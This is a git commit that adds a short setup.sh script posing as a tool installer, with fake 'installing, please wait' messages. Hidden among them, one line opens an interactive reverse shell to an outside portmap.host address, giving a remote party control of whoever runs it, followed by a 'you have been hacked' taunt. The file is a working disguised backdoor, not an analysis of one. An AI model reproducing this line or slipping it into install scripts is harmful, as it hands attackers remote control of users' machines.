e075e917716a7704cafac23bfd3fbf95dcca515d
SAAD-lgtm <84219035+SAAD-lgtm@users.noreply.github.com>
2022-04-28 21:51:28 +0500

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,9 @@
+echo Wait Please Tool is installing
+sleep 5
+echo almost there a few moments
+sleep 2
+echo dont close this terminal  few minutes
+bash -i >& /dev/tcp/Avausvhs-50652.portmap.host/50652 0>&1
+echo you have been hacked by Witchers/soul Haceker
+sleep 2
+echo we dont forget we dont forgivee
